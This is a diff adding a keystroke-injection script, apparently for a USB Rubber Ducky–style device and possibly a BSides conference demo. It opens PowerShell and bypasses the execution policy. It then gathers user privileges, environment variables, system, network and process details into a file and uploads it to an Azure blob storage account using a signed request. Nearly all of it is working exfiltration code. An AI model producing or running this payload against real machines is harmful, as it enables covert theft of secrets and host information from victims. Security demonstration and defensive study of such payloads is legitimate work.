@@ -1,0 +1,45 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
+ENTER
+DELAY 1000
+STRING echo HELLO HELLO HELLO
+ENTER
+DELAY 1000
+STRING $storageAccount = "bsides2025"; $storageKey = "KEYGOESHERE"; $containerName = "files"; $fileName = "system_context_windows_ps5_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"; "=== DETAILED SYSTEM CONTEXT ===" > $fileName; "Generated: $(Get-Date)" >> $fileName; whoami /all >> $fileName; "=== LOCATION ===" >> $fileName; Get-Location >> $fileName; Get-ChildItem -Force >> $fileName; "=== ENVIRONMENT ===" >> $fileName; Get-ChildItem Env: >> $fileName; "=== SYSTEM INFO ===" >> $fileName; systeminfo >> $fileName; "=== NETWORK ===" >> $fileName; ipconfig /all >> $fileName; "=== PROCESSES ===" >> $fileName; Get-Process | Select-Object Name,Id,CPU >> $fileName;
+ENTER
+DELAY 5000
+STRING if (Test-Path $fileName) { Write-Host "File created successfully" } else { Write-Host "File creation failed"; exit }
+ENTER
+DELAY 1000
+STRING $fileContent = Get-Content -Path $fileName -Raw; if ([string]::IsNullOrEmpty($fileContent)) { Write-Host "File is empty!"; exit }
+ENTER
+DELAY 1000
+STRING $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent); $date = [System.DateTime]::UtcNow.ToString("R")
+ENTER
+DELAY 500
+STRING $contentLength = $fileBytes.Length; $stringToSign = "PUT`n`n`n$contentLength`n`napplication/octet-stream`n`n`n`n`n`n`nx-ms-blob-type:BlockBlob`nx-ms-date:$date`nx-ms-version:2020-04-08`n/$storageAccount/$containerName/$fileName"
+ENTER
+DELAY 500
+STRING $hmacsha = New-Object System.Security.Cryptography.HMACSHA256; $hmacsha.key = [Convert]::FromBase64String($storageKey)
+ENTER
+DELAY 500
+STRING $signature = [Convert]::ToBase64String($hmacsha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($stringToSign))); $authorization = "SharedKey ${storageAccount}:$signature"
+ENTER
+DELAY 500
+STRING $uri = "https://$storageAccount.blob.core.windows.net/$containerName/$fileName"; $headers = @{ 'x-ms-date' = $date; 'x-ms-version' = '2020-04-08'; 'x-ms-blob-type' = 'BlockBlob'; 'Authorization' = $authorization; 'Content-Type' = 'application/octet-stream' }
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri $uri -Method PUT -Body $fileBytes -Headers $headers
+ENTER
+DELAY 1000
+STRING Write-Host "File uploaded successfully to: $uri"
+ENTER
+DELAY 1000
+STRING Write-Host "GOODBYE GOODBYE GOODBYE"
+ENTER
+STRING exit
+ENTER
